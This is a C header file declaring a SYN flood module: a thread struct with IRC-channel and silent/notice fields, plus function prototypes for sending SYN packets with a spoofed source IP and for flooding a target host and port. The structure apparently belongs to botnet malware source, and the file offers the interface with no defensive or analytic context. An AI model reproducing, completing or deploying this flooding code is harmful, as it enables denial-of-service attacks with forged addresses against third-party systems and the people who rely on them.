#ifndef NO_SYN 
#define IP_HDRINCL  2 
 
typedef struct SYNT {

	SOCKET socket;
	int threadnum;
	char ip[128];
	char port[128];
	char length[128];
	char chan[128];
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} SYNT;

DWORD WINAPI synthread(LPVOID param);
long SendSyn(unsigned long TargetIP, unsigned int SpoofingIP, unsigned short TargetPort,int Times);
long SYNFlood(char *target, char *port, char *len);
#endif
